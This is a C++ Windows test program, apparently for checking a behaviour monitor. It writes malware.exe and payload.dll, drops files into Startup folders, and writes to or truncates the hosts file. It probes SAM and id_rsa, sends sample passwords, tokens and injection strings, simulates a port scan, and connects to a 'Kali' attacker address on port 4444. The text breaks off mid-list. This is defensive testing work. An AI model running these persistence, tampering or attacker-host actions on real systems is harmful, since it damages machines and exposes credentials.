

#include <ws2tcpip.h>
#include<windows.h>
#include<stdio.h>
#include <stdlib.h>
#include <iostream>
#define PAGE_SIZE	4096

#include <fstream> 
#include <direct.h>  // ���� _mkdir
// Ȼ���������ͷ�ļ�
#include <string>
#include <vector>
#include <Lmcons.h> 
#include <cctype>
#include <random>
#include <algorithm>
#include <thread>
#include <chrono>
#include <cctype>   // ���� toupper
#include <Lmcons.h> // ���� UNLEN �� GetUserNameW


#pragma comment(lib, "ws2_32.lib")  //���� ws2_32.dll


using namespace std;
void showMenu();
void TestMaliciousFileReads();
void TestMaliciousWrites();
void TestMaliciousAttributes();
void TestMaliciousMoves();
void TestMaliciousCreateFileA();
void TestMaliciousSends();
void TestMaliciousSendTo();
void TestMaliciousRecv();
void TestMaliciousRecvFrom();
void TestMaliciousConnects();
void TestMaliciousWSAConnects();
void TestMaliciousSocketClose();
void TestMaliciousGetAddrInfo();
void TestMaliciousSocketCreation();
//---------------------------------
void CREATEPROCESSW();
void CREATETHREAD();
void EXITTHREAD();
void LOADLIBRARYEXA();
void GETPROCADDRESS();
void VIRTUALALLOCEX();
void WRITEPROCESSMEMORY();
//---------------------------------
void dangerousKeyLogging();
void suspiciousKeyStateLogging();
void simulateHotkeyRegistration();
void installSetWindowsHookExATest();
void testGetCursorPos();
void testSetCursorPos();
void testVirtualFree();
void testNtReadVirtualMemory();
int main() {
	int op = 0;
	while (1) {
		showMenu();
		scanf_s("%d", &op);
		switch (op)
		{
			// exit
		case 0: {
			printf("bye!\n");
			break;
		}
		case 999: {
			MessageBoxA(NULL, "I'm MessageBoxA", "I'm title", MB_OK);
			break;
		}
		case 1: {
			TestMaliciousFileReads();
			break;
		}
		case 2: {
			TestMaliciousWrites();
			break;
		}
		case 3: {
			TestMaliciousAttributes();
			break;
		}
		case 4: {
			TestMaliciousMoves();
			break;
		}
		case 5: {
			TestMaliciousCreateFileA();
			break;
		}
		case 6: {
			TestMaliciousSends();
			break;
		}
		case 7: {
			TestMaliciousSendTo();
			break;
		}
		case 8: {
			TestMaliciousRecv();
			break;
		}
		case 9: {
			TestMaliciousRecvFrom();
			break;
		}
		case 10: {
			TestMaliciousConnects();
			break;
		}
		case 11: {
			TestMaliciousWSAConnects();
			break;
		}
		case 12: {
			TestMaliciousGetAddrInfo();
			break;
		}
		case 13: {
			TestMaliciousSocketCreation();
			break;
		}
		case 14: {
			TestMaliciousSocketClose();
			break;
		}
		case 101: {
			CREATEPROCESSW();
			break;
		}
		case 102: {
			CREATETHREAD();
			break;
		}
		case 103: {
			EXITTHREAD();
			break;
		}
		case 104: {
			LOADLIBRARYEXA();
			break;
		}
		case 105: {
			GETPROCADDRESS();
			break;
		}
		case 106: {
			VIRTUALALLOCEX();
			break;
		}
		case 107: {
			WRITEPROCESSMEMORY();
			break;
		}
		
		case 201: {
			for (int i = 0; i < 10; i++) {
				dangerousKeyLogging();
				Sleep(1000);
			}
			break;
		}
		case 202: {
			for (int i = 0; i < 10; i++) {
				suspiciousKeyStateLogging();
				Sleep(1000);
			}
			break;
		}
		case 203: {
			simulateHotkeyRegistration();
			break;
		}
		case 204: {
			installSetWindowsHookExATest();
			break;
		}
		case 205: {
			testGetCursorPos();
			break;
		}
		case 206: {
			testSetCursorPos();
			break;
		}
		case 207: {
			testVirtualFree();
			break;
		}
		case 208: {
			testNtReadVirtualMemory();
			break;
		}

		}
		// exit
		if (op == 0) {
			break;
		}
	}
	return 0;
}
void showMenu() {
	//printf("\n*************************************************************************************\n");
	printf("--------------------------------please select an option--------------------------------\n");
	printf("\n");

	printf("--------------------------------�ļ�������ء�������Ϊ���--------------------------------\n");
	printf("\n");
	printf("1. TestMaliciousFileReads    2. TestMaliciousWrites    3. TestMaliciousAttributes    4. TestMaliciousMoves\n");
	printf("5. TestMaliciousCreateFileA    6. TestMaliciousSends    7. TestMaliciousSendTo    8. TestMaliciousRecv\n");
	printf("9. TestMaliciousRecvFrom    10. TestMaliciousConnects    11. TestMaliciousWSAConnects    12. TestMaliciousGetAddrInfo\n");
	printf("13. TestMaliciousSocketCreation    14. TestMaliciousSocketClose\n");
	printf("\n");

	printf("--------------------------------�����߳���Ϊ��ء�������Ϊ���--------------------------------\n");
	printf("\n");
	printf("101. CREATEPROCESSW    102. CREATETHREAD    103. EXITTHREAD    104. LOADLIBRARYEXA\n");
	printf("105. GETPROCADDRESS    106. VIRTUALALLOCEX    107. WRITEPROCESSMEMORY\n");
	printf("\n");

	printf("--------------------------------���������Ϊ��ء��ڴ���Դ���--------------------------------\n");
	printf("\n");
	printf("201.dangerousKeyLogging    202. suspiciousKeyStateLogging    203. simulateHotkeyRegistration    204. installSetWindowsHookExATest\n");
	printf("205. testGetCursorPos    206. testSetCursorPos    207. testVirtualFree    208. testNtReadVirtualMemory\n");
	printf("\n");
	printf("������ţ�ѡ��һ�����Ժ�����\n");
	printf("\n");

}

/*--------------------------------------------------------------------------------------------------------------
-------------------------------------------------����---------------------------------------------------------
----------------------------------------------------------------------------------------------------------------*/


void TestMaliciousFileReads() {
	// 1. ȷ����ʱĿ¼���ļ�����
	_mkdir("D:\\test");  // ����Ŀ¼����������ڣ�
	std::ofstream tmpFile("D:\\test\\testfile.txt");
	if (tmpFile) {
		tmpFile << "Test content";
		tmpFile.close();
	}
	else {
		std::cerr << "[ERROR] Failed to create D:\\test\\testfile.txt\n";
	}

	// 2. ����·���б��滻Ϊ�ɷ��ʵ�·����
	std::vector<std::string> testPaths = {
		"C:\\Windows\\System32\\drivers\\etc\\hosts",  // ͨ���ɶ�
		"D:\\test\\testfile.txt",                     // ��ʱ�ļ�
		"C:\\Windows\\win.ini",                       // �������Ŀ¼�ļ�
		// "\\\\NAS\\real_share\\file.ini"            // ��������·������ʱ����
	};

	// 3. ��������·��
	for (const auto& path : testPaths) {
		HANDLE hFile = CreateFileA(
			path.c_str(),
			GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);

		if (hFile != INVALID_HANDLE_VALUE) {
			BYTE buffer[1024];
			DWORD bytesRead;
			if (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL)) {
				std::cout << "[SUCCESS] Read " << bytesRead << " bytes from: " << path << "\n";
			}
			else {
				std::cerr << "[ERROR] Read failed: " << path << " (Error: " << GetLastError() << ")\n";
			}
			CloseHandle(hFile);
		}
		else {
			DWORD err = GetLastError();
			std::cerr << "[FAILED] Open failed: " << path << " (Error: " << err << ")\n";
		}
	}
}

// ����������Ƿ����
bool IsDriveAvailable(char driveLetter) {
	driveLetter = toupper(driveLetter);
	DWORD drives = GetLogicalDrives();
	return (drives & (1 << (driveLetter - 'A')));
}

// ����Ŀ¼����������ڣ�
void EnsureDirectoryExists(const std::string& path) {
	size_t pos = path.find_last_of("\\/");
	if (pos != std::string::npos) {
		std::string dir = path.substr(0, pos);
		_mkdir(dir.c_str()); // ���Դ��󣨿����Ѵ��ڣ�
	}
}
//����д�����
void TestMaliciousWrites() {
	// ����·���б��Ż����·����
	std::vector<std::string> testPaths = {
		// 1. ��ִ���ļ������ÿ�дĿ¼��
		"C:\\Temp\\malware.exe",
		"C:\\Temp\\payload.dll",

		// 2. ϵͳ·�������������ԱȨ�޵�·���Բ��Է�����
		"C:\\Windows\\Tasks\\schedule.bat", // ͨ����д
		"C:\\Windows\\System32\\drivers\\rogue.sys", // ����Ȩ�޼��

		// 3. ����Ŀ¼��ʹ�õ�ǰ�û���·����
		"C:\\Users\\" + std::string(getenv("USERNAME")) +
		"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.vbs",

		// 4. �����ļ�����ʱ�ļ�
		"C:\\ProgramData\\app_config.ini",
		"C:\\Temp\\file1.tmp",
		"C:\\Users\\Public\\Documents\\report.txt"
	};

	for (const auto& path : testPaths) {
		// ���������ڵ�������
		if (path.size() > 1 && path[1] == ':' && !IsDriveAvailable(path[0])) {
			std::cerr << "[SKIPPED] Drive not found: " << path << "\n";
			continue;
		}

		// ȷ��Ŀ¼����
		EnsureDirectoryExists(path);

		HANDLE hFile = CreateFileA(
			path.c_str(),
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);

		if (hFile != INVALID_HANDLE_VALUE) {
			const char* testData = "Test data for malicious write";
			DWORD bytesWritten;
			if (WriteFile(hFile, testData, strlen(testData), &bytesWritten, NULL)) {
				std::cout << "[SUCCESS] Wrote " << bytesWritten << " bytes to: " << path << "\n";
			}
			else {
				std::cerr << "[ERROR] Write failed: " << path << " (Error: " << GetLastError() << ")\n";
			}
			CloseHandle(hFile);
		}
		else {
			DWORD err = GetLastError();
			std::cerr << "[ERROR] Failed to create file: " << path << " (Error: " << err << ")\n";
		}
	}
}

#include <Lmcons.h> // ���� UNLEN �� GetUserNameW


// ��ȡ��ǰ�û���
std::wstring GetCurrentUsername() {
	wchar_t username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameW(username, &username_len);
	return username;
}

// ����������Ƿ����
bool IsDriveAvailable(wchar_t driveLetter) {
	driveLetter = towupper(driveLetter);
	DWORD drives = GetLogicalDrives();
	return (drives & (1 << (driveLetter - L'A')));
}

void TestMaliciousAttributes() {
	// ��ȡ��ǰ�û���
	std::wstring currentUser = GetCurrentUsername();

	// ����·���б���̬�滻�û����ͼ��·����
	std::vector<std::wstring> testPaths = {
		// 1. ϵͳ�ؼ�Ŀ¼
		L"C:\\Windows\\System32",
		L"C:\\Windows\\SysWOW64",  // ���� SysMOM64 Ϊ SysWOW64
		L"C:\\Windows\\System",

		// 2. ע����ļ��������Բ���Ȩ�ޣ�
		L"C:\\Windows\\System32\\config\\SAM",
		L"C:\\Windows\\System32\\config\\SYSTEM",
		L"C:\\Windows\\System32\\config\\SECURITY",
		L"C:\\Users\\" + currentUser + L"\\NTUSER.DAT",  // ʹ�õ�ǰ�û�

		// 3. ����/��ʱ�ļ���ȷ��·�����ڣ�
		L"C:\\Users\\" + currentUser + L"\\AppData\\Local\\Temp\\hidden_file.tmp",
		L"C:\\ProgramData\\Microsoft\\Windows\\HiddenFolder\\config.ini",  // ����ǰ����
		L"C:\\Users\\" + currentUser + L"\\.ssh\\id_rsa",  // ����·��

		// 4. ��ִ���ļ�
		//L"C:\\Windows\\System32\\cmd.exe",
		L"C:\\Windows\\System32\\kernel32.dll",
		L"C:\\Windows\\System32\\drivers\\ntfs.sys",  // ���� ntf-sys Ϊ ntfs.sys

		// 5. �����ļ������������ڵ���������
		L"C:\\Users\\Public\\Documents\\report.txt",
		// L"D:\\data\\backup.zip",  // ��̬��������
		// L"E:\\archive\\logs.log"  // ��̬��������
	};

	// ��̬��Ӵ��ڵ�������·��
	if (IsDriveAvailable(L'D')) {
		testPaths.push_back(L"D:\\data\\backup.zip");
	}
	if (IsDriveAvailable(L'E')) {
		testPaths.push_back(L"E:\\archive\\logs.log");
	}

	// ���Է����ļ�����
	for (const auto& path : testPaths) {
		// ���������ڵ�·������ HiddenFolder��
		DWORD attrs = GetFileAttributesW(path.c_str());
		if (attrs == INVALID_FILE_ATTRIBUTES && GetLastError() == ERROR_FILE_NOT_FOUND) {
			std::wcerr << L"[SKIPPED] Path not found: " << path << L"\n";
			continue;
		}

		// ���»�ȡ�����Լ��Ȩ��
		attrs = GetFileAttributesW(path.c_str());
		if (attrs != INVALID_FILE_ATTRIBUTES) {
			std::wcout << L"[SUCCESS] Accessed attributes of: " << path << L"\n";
			std::wcout << L"Attributes: ";

			if (attrs & FILE_ATTRIBUTE_DIRECTORY) std::wcout << L"DIRECTORY ";
			if (attrs & FILE_ATTRIBUTE_ARCHIVE) std::wcout << L"ARCHIVE ";
			if (attrs & FILE_ATTRIBUTE_HIDDEN) std::wcout << L"HIDDEN ";
			if (attrs & FILE_ATTRIBUTE_SYSTEM) std::wcout << L"SYSTEM ";
			if (attrs & FILE_ATTRIBUTE_READONLY) std::wcout << L"READONLY ";
			std::wcout << L"\n";
		}
		else {
			DWORD err = GetLastError();
			std::wcerr << L"[ERROR] Failed to access: " << path
				<< L" (Error: " << err << L")\n";
		}
	}
}

// �����ļ��ƶ����Ժ���
void TestMaliciousMoves()
{
	// ��ȡ��ǰ�û���
	std::wstring username = GetCurrentUsername();

	// ��������·��
	std::vector<std::pair<std::wstring, std::wstring>> testMoves = {
		// 1. �ƶ�ϵͳ�ļ�
		//{L"C:\\Windows\\System32\\drivers\\etc\\hosts", L"C:\\Temp\\hosts.bak"},
		//{L"C:\\Windows\\System32\\cmd.exe", L"D:\\Backup\\cmd_copy.exe"},

		// 2. �ƶ�������Ŀ¼
		{L"C:\\Temp\\config.ini", L"C:\\Windows\\System32\\config.ini"},
		{L"D:\\Downloads\\payload.dll", L"C:\\Program Files\\Common Files\\payload.dll"},
		{L"E:\\malware.exe", L"C:\\Users\\" + username + L"\\AppData\\Roaming\\malware.exe"},

		// 3. �ƶ�������Ŀ¼
		{L"C:\\Temp\\startup.vbs", L"C:\\Users\\" + username + L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.vbs"},
		{L"D:\\autorun.ps1", L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\autorun.ps1"},

		// 4. ������Ϊ��ִ���ļ�
		{L"C:\\Users\\Public\\Documents\\data.txt", L"C:\\Users\\Public\\Documents\\data.exe"},
		{L"D:\\logs\\system.log", L"E:\\system\\winlogon.exe"},

		// 5. ������Ϊ�����ļ�
		{L"C:\\Temp\\secret.txt", L"C:\\Temp\\.hidden_secret"},
		{L"D:\\credentials.dat", L"E:\\$hidden\\credentials.dat"},

		// 6. ����ƶ�����������������
		{L"C:\\Temp\\file1.tmp", L"C:\\Temp\\file1_moved.tmp"},
		{L"C:\\Temp\\file2.tmp", L"C:\\Temp\\file2_moved.tmp"},
		{L"C:\\Temp\\file3.tmp", L"C:\\Temp\\file3_moved.tmp"},
		{L"C:\\Temp\\file4.tmp", L"C:\\Temp\\file4_moved.tmp"},
		{L"C:\\Temp\\file5.tmp", L"C:\\Temp\\file5_moved.tmp"},

		// 7. ��ͨ�ƶ�����
		{L"C:\\Users\\Public\\Downloads\\document.docx", L"D:\\Archive\\document.docx"},
		{L"E:\\old_logs\\app.log", L"E:\\archive\\logs\\app.log"}
	};

	// ���������ļ�
	for (const auto& movePair : testMoves) {
		// ����Դ�ļ�
		HANDLE hFile = CreateFileW(
			movePair.first.c_str(),
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);

		if (hFile != INVALID_HANDLE_VALUE) {
			const char* data = "Test file content";
			DWORD bytesWritten;
			WriteFile(hFile, data, strlen(data), &bytesWritten, NULL);
			CloseHandle(hFile);
		}
	}

	// ִ���ƶ�����
	for (const auto& movePair : testMoves) {
		if (MoveFileW(movePair.first.c_str(), movePair.second.c_str())) {
			std::wcout << L"[SUCCESS] Moved: " << movePair.first
				<< L" -> " << movePair.second << L"\n";
		}
		else {
			DWORD err = GetLastError();
			std::wcerr << L"[ERROR] Failed to move: " << movePair.first
				<< L" -> " << movePair.second
				<< L" (Error: " << err << L")\n";
		}

		// ���ڿ����ƶ����ԣ�����ӳ��Ա���һ�������
		if (movePair.first.find(L"file1.tmp") != std::wstring::npos) {
			Sleep(100); // 100ms �ӳ�
		}
	}
}

// �����ļ��������Ժ���
void TestMaliciousCreateFileA()
{
	// �����������
	struct TestCase {
		std::string path;
		DWORD access;
		DWORD creation;
		std::string description;
	};

	std::vector<TestCase> testCases = {
		// 1. ����д��ϵͳ�ļ�
		{"C:\\Windows\\System32\\drivers\\etc\\hosts", GENERIC_WRITE, OPEN_EXISTING, "Write to system hosts file"},

		// 2. ���Ը���ϵͳ�ļ�
		{"C:\\Windows\\System32\\drivers\\etc\\hosts", GENERIC_WRITE, TRUNCATE_EXISTING, "Truncate system hosts file"},

		// 3. ������ϵͳ�ļ�
		{"C:\\Windows\\System32\\malicious.dll", GENERIC_WRITE, CREATE_ALWAYS, "Create new DLL in system32"},

		// 4. ���Ը����û��ĵ�
		{"C:\\Users\\Public\\Documents\\important.doc", GENERIC_WRITE, TRUNCATE_EXISTING, "Truncate user document"},

		// 5. ����������
		{"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\malware.exe", GENERIC_WRITE, CREATE_ALWAYS, "Create startup executable"},

		// 6. ���Ը��������ļ�
		{"C:\\Program Files\\Common Files\\config.ini", GENERIC_WRITE, CREATE_ALWAYS, "Overwrite configuration file"},

		// 7. ������ʱ�ļ�������������
		{"C:\\Temp\\test.tmp", GENERIC_WRITE, CREATE_ALWAYS, "Create temporary file"},

		// 8. ֻ������ϵͳ�ļ�����Ӧ����д���棩
		{"C:\\Windows\\System32\\kernel32.dll", GENERIC_READ, OPEN_EXISTING, "Read system DLL"},

		// 9. ��TRUNCATE_EXISTING��ʽ����ͨ�ļ�
		{"D:\\data\\log.txt", GENERIC_WRITE, TRUNCATE_EXISTING, "Truncate log file"},

		// 10. ���������ļ�
		{"C:\\Users\\Public\\hidden.dat", GENERIC_WRITE, CREATE_ALWAYS, "Create hidden file"}
	};

	for (const auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";

		HANDLE hFile = CreateFileA(
			test.path.c_str(),
			test.access,
			FILE_SHARE_READ,
			NULL,
			test.creation,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);

		if (hFile != INVALID_HANDLE_VALUE) {
			std::cout << "  [SUCCESS] File opened/created: " << test.path << "\n";

			// �����д����������д������
			if (test.access & (GENERIC_WRITE | GENERIC_ALL)) {
				const char* data = "Malicious data";
				DWORD bytesWritten;

				if (WriteFile(hFile, data, strlen(data), &bytesWritten, NULL)) {
					std::cout << "  [SUCCESS] Wrote " << bytesWritten << " bytes\n";
				}
				else {
					std::cerr << "  [ERROR] Write failed: " << GetLastError() << "\n";
				}
			}

			CloseHandle(hFile);
		}
		else {
			std::cerr << "  [ERROR] Failed to open/create: " << test.path
				<< " (Error: " << GetLastError() << ")\n";
		}

		std::cout << "----------------------------------------\n";
	}
}

// ����������ݰ�
std::string GenerateRandomData(size_t length) {
	std::string random_data;
	random_data.reserve(length);

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> dis(32, 126); // �ɴ�ӡASCII�ַ�

	for (size_t i = 0; i < length; ++i) {
		random_data.push_back(static_cast<char>(dis(gen)));
	}

	return random_data;
}

// �������緢�Ͳ��Ժ���
void TestMaliciousSends()
{
	// ��ʼ��Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// ����TCP�׽���
	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		std::cerr << "Socket creation failed: " << WSAGetLastError() << "\n";
		WSACleanup();
		return;
	}

	// ����Ŀ���ַ�����ػػ���ַ��
	sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(80); // HTTP�˿�
	inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

	// �������ӣ���ʹ����ʧ�ܣ��������ܲ���send������
	connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr));

	// �����������
	struct TestCase {
		std::string data;
		std::string description;
		bool expectKeywordWarning;
		bool expectSizeWarning;
	};

	std::vector<TestCase> testCases = {
		// 1. �������봫��
		{"username=admin&password=Secret123!", "Plaintext password", true, false},

		// 2. API��Կ����
		{"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9", "API token", true, false},

		// 3. ����ע�볢��
		{"|echo 'malicious' > /tmp/exploit", "Command injection", true, false},

		// 4. SQLע�볢��
		{"' OR 1=1;--", "SQL injection", true, false},

		// 5. ���ļ�����
		{GenerateRandomData(2048), "Large payload (2KB)", false, true},

		// 6. �����ļ�����
		{GenerateRandomData(10240), "Very large payload (10KB)", false, true},

		// 7. ����������ݺʹ�ߴ�
		{"password=Secret123&data=" + GenerateRandomData(1500), "Mixed sensitive and large", true, true},

		// 8. ���������ݣ����ܰ���������Ϣ��
		{std::string(100, '\0') + "password" + std::string(100, '\xFF'), "Binary data with keyword", true, false},

		// 9. ��������
		{"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n", "Normal HTTP request", false, false},

		// 10. �������ݣ�ģ�⣩
		{"U2FsdGVkX1+Wv2f8u3C5f7XbZaY7hD1kKjLpMnOpQqw=", "Encrypted data", false, false}
	};

	for (const auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";

		// ��������
		int bytesSent = send(sock, test.data.c_str(), static_cast<int>(test.data.size()), 0);

		if (bytesSent == SOCKET_ERROR) {
			std::cerr << "  [ERROR] Send failed: " << WSAGetLastError() << "\n";
		}
		else {
			std::cout << "  [SUCCESS] Sent " << bytesSent << " bytes\n";

			// ���Ԥ�ھ���
			std::cout << "  Expected warnings: ";
			if (test.expectKeywordWarning) std::cout << "Keyword ";
			if (test.expectSizeWarning) std::cout << "Size ";
			if (!test.expectKeywordWarning && !test.expectSizeWarning) std::cout << "None";
			std::cout << "\n";
		}

		std::cout << "----------------------------------------\n";
	}

	// ����
	closesocket(sock);
	WSACleanup();
}

// �������緢�Ͳ��Ժ��� (UDP)
void TestMaliciousSendTo()
{
	// ��ʼ��Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// ����UDP�׽���
	SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock == INVALID_SOCKET) {
		std::cerr << "Socket creation failed: " << WSAGetLastError() << "\n";
		WSACleanup();
		return;
	}

	// ����Ŀ���ַ�����ػػ���ַ��
	sockaddr_in serverAddr;
	serverAddr.sin_family = AF_INET;
	serverAddr.sin_port = htons(0); // ��̬�˿�
	inet_pton(AF_INET, "127.0.0.1", &serverAddr.sin_addr);

	// �����������
	struct TestCase {
		std::string data;
		std::string description;
		bool expectKeywordWarning;
		bool expectPortScanWarning;
	};

	std::vector<TestCase> testCases = {
		// 1. �������ݣ����룩
		{"username=admin&password=P@ssw0rd123", "Sensitive data (password)", true, false},

		// 2. API��Կ����
		{"API_KEY: 7d5f8a3b-9c1e-4f2a-8d3c-6b5a9e1f0d7a", "API key transmission", true, false},

		// 3. С���ݰ������ܶ˿�ɨ�裩
		{"PING", "Small UDP packet (possible port scan)", false, true},

		// 4. ���С���ݰ����˿�ɨ�裩
		{"SCAN", "Multiple small packets (port scan simulation)", false, true},

		// 5. �������ݣ�ģ�⣩
		{"U2FsdGVkX1+Wv2f8u3C5f7XbZaY7hD1kKjLpMnOpQqw=", "Encrypted data", false, false},

		// 6. DNS��ѯ������UDP������
		{"\xAA\xAA\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01",
		 "DNS query", false, false},


	};

	// �˿�ɨ��ģ��
	std::vector<int> portsToScan = { 80, 443, 53, 22, 3389, 8080, 21, 25, 110, 143 };

	for (const auto& test : testCases) {
		std::cout << "Testing: " << test.description << "\n";

		// ����Ŀ��˿�
		int port = test.description.find("port scan") != std::string::npos ?
			portsToScan[rand() % portsToScan.size()] : 12345;
		serverAddr.sin_port = htons(port);

		// ��������
		int bytesSent = sendto(
			sock,
			test.data.c_str(),
			static_cast<int>(test.data.size()),
			0,
			(sockaddr*)&serverAddr,
			sizeof(serverAddr)
		);

		if (bytesSent == SOCKET_ERROR) {
			std::cerr << "  [ERROR] Sendto failed: " << WSAGetLastError() << "\n";
		}
		else {
			std::cout << "  [SUCCESS] Sent " << bytesSent << " bytes to port " << port << "\n";

			// ���Ԥ�ھ���
			std::cout << "  Expected warnings: ";
			if (test.expectKeywordWarning) std::cout << "Keyword ";
			if (test.expectPortScanWarning) std::cout << "PortScan ";
			if (!test.expectKeywordWarning && !test.expectPortScanWarning) std::cout << "None";
			std::cout << "\n";
		}

		// ���ڶ˿�ɨ����ԣ����Ͷ��С��
		if (test.description.find("Multiple") != std::string::npos) {
			for (int port : portsToScan) {
				serverAddr.sin_port = htons(port);
				std::string scanPacket = "SCAN:" + std::to_string(port);

				sendto(
					sock,
					scanPacket.c_str(),
					static_cast<int>(scanPacket.size()),
					0,
					(sockaddr*)&serverAddr,
					sizeof(serverAddr)
				);

				std::cout << "  [SCAN] Sent scan packet to port " << port << "\n";
				std::this_thread::sleep_for(std::chrono::milliseconds(10));
			}
		}

		std::cout << "----------------------------------------\n";
	}

	// ����
	closesocket(sock);
	WSACleanup();
}

void TestMaliciousRecv()
{
	// ��ʼ�� Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// �����ͻ����׽���
	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (clientSocket == INVALID_SOCKET) {
		std::cerr << "Client socket creation failed: " << WSAGetLastError() << "\n";
		WSACleanup();
		return;
	}

	// ���� Kali ����������
	sockaddr_in kaliAddr;
	kaliAddr.sin_family = AF_INET;
	kaliAddr.sin_port = htons(4444);  // �����߼����Ķ˿�
	inet_pton(AF_INET, "192.168.10.128", &kaliAddr.sin_addr);  // ������ IP

	if (connect(clientSocket, (sockaddr*)&kaliAddr, sizeof(kaliAddr)) == SOCKET_ERROR) {
		std::cerr << "Connect to Kali failed: " << WSAGetLastError() << "\n";
		closesocket(clientSocket);
		WSACleanup();
		return;
	}

	std::cout << "[+] Connected to Kali server.\n";

	// ģ���������
	char buffer[15000]; // 15KB ������
	int totalReceived = 0;

	while (true) {
		int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
		if (bytesReceived == SOCKET_ERROR) {
			std::cerr << "Recv failed: " << WSAGetLastError() << "\n";
			break;
		}

		if (bytesReceived == 0) {
			std::cout << "Connection closed by server\n";
			break;
		}

		totalReceived += bytesReceived;
		std::cout << "[+] Received " << bytesReceived << " bytes (total: " << totalReceived << ")\n";

		// ��ӡǰ100�ֽ�
		std::string preview(buffer, bytesReceived < 100 ? bytesReceived : 100);
		for (auto& c : preview) {
			if (!std::isprint(static_cast<unsigned char>(c))) {
				c = '.';
			}
		}
		std::cout << "Preview: " << preview << "\n";
	}

	closesocket(clientSocket);
	WSACleanup();
}

void TestMaliciousRecvFrom()
{
	// ��ʼ�� Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// ���� UDP �׽���
	SOCKET udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (udpSocket == INVALID_SOCKET) {
		std::cerr << "Socket creation failed: " << WSAGetLastError() << "\n";
		WSACleanup();
		return;
	}

	// �󶨵�����4444�˿�
	sockaddr_in localAddr;
	localAddr.sin_family = AF_INET;
	localAddr.sin_port = htons(4444);        // ��ȷ�󶨵�4444�˿�
	localAddr.sin_addr.s_addr = htonl(INADDR_ANY);  // ������������ӿڵ�����

	if (bind(udpSocket, (sockaddr*)&localAddr, sizeof(localAddr)) == SOCKET_ERROR) {
		std::cerr << "Bind failed: " << WSAGetLastError() << "\n";
		closesocket(udpSocket);
		WSACleanup();
		return;
	}

	// Kali ������������ַ
	sockaddr_in kaliAddr;
	kaliAddr.sin_family = AF_INET;
	kaliAddr.sin_port = htons(5555);  // Kali ������UDP�˿�
	inet_pton(AF_INET, "192.168.10.128", &kaliAddr.sin_addr);

	// �� Kali �������ֻ�����
	const char* hello = "HELLO_FROM_VICTIM";
	sendto(udpSocket, hello, (int)strlen(hello), 0,
		(sockaddr*)&kaliAddr, sizeof(kaliAddr));
	std::cout << "[+] Sent handshake to Kali.\n";

	// ��ʼ�������ݣ�ģ�ⴥ�� recvfrom hook��
	char buffer[15000];
	sockaddr_in fromAddr;
	int fromLen = sizeof(fromAddr);
	int totalReceived = 0;

	for (int i = 0; i < 8; i++) {  // �������8�����ݰ�
		int bytesReceived = recvfrom(
			udpSocket,
			buffer,
			sizeof(buffer),
			0,
			(sockaddr*)&fromAddr,
			&fromLen
		);

		if (bytesReceived == SOCKET_ERROR) {
			std::cerr << "Recvfrom failed: " << WSAGetLastError() << "\n";
			break;
		}

		totalReceived += bytesReceived;

		// ��ӡ��Դ��ַ
		char senderIP[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &fromAddr.sin_addr, senderIP, INET_ADDRSTRLEN);
		int senderPort = ntohs(fromAddr.sin_port);

		std::cout << "Received " << bytesReceived << " bytes from "
			<< senderIP << ":" << senderPort
			<< " (total: " << totalReceived << ")\n";

		// ��ӡǰ100�ֽ�����
		std::string preview(buffer, bytesReceived < 100 ? bytesReceived : 100);
		for (auto& c : preview) {
			if (!std::isprint(static_cast<unsigned char>(c))) c = '.';
		}
		std::cout << "Preview: " << preview << "\n";

		std::this_thread::sleep_for(std::chrono::milliseconds(200));
	}

	closesocket(udpSocket);
	WSACleanup();
}

void TestMaliciousConnects()
{
	// ��ʼ�� Winsock
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		std::cerr << "WSAStartup failed: " << WSAGetLastError() << "\n";
		return;
	}

	// Kali ��������ַ
	std::string kaliIP = "192.168.10.128";

	// Ҫ���ԵĶ˿��б�
	std::vector<int> ports = {
		22,     // SSH
		23,     // Telnet
		21,     // FTP
		445,    // SMB
		3389,   // RDP
		139,    // NetBIOS
